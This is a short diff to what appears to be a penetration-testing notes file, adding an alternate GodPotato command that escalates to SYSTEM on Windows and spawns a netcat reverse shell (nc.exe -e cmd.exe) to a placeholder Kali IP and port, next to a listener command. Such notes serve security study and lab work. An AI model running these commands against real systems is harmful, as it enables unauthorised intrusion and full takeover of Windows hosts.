@@ -706,6 +706,15 @@ nc -nvlp 4567
 # C:\Windows\System32> whoami
 # nt authority\system
 ```
+
+## Alternate GodPotato syntax - use full path to cmd.exe if relative path fails
+```bash
+.\GodPotato.exe -cmd "C:\Users\Public\nc.exe -e C:\Windows\System32\cmd.exe <KALI IP> <PORT>"
+
+# NOTE: Use this version if the standard cmd /c version fails.
+# The difference is using the full path to cmd.exe instead of relying on PATH.
+```
+
 # WriteDacl Example
 
 ![alt text](image-15.png)
